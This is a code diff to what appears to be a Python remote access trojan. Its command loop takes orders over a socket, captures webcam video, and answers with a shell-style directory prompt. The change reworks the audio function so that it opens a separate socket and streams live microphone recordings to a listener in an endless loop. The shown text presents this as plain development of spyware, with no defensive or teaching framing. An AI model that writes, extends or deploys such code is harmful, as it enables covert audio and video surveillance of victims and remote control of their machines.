@@ -7,11 +7,12 @@ import subprocess
 import cv2
 import pyaudio
 
-def audio(s):
+def audio():
+    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s1.connect(('127.0.0.1',1235))
     chunk = 1024
     FORMAT = pyaudio.paInt16
     channels = 1
-
     sample_rate = 44100
     record_seconds = 5
     p = pyaudio.PyAudio()
@@ -22,8 +23,11 @@ def audio(s):
                     output=True,
                     frames_per_buffer=chunk)
     while True:
-        data = stream.read(chunk)
-        s.send(data)
+        try:
+            data = stream.read(chunk)
+            s1.send(data)
+        except:
+            break
 
 def webcam(s):
     cap = cv2.VideoCapture(0)
@@ -115,7 +119,7 @@ def cmd(s):
             webcam(s)
             continue
         elif cmd == 'audio':
-            audio(s)
+            audio()
             continue
         else:
             s.send((os.getcwd() + ">").encode())
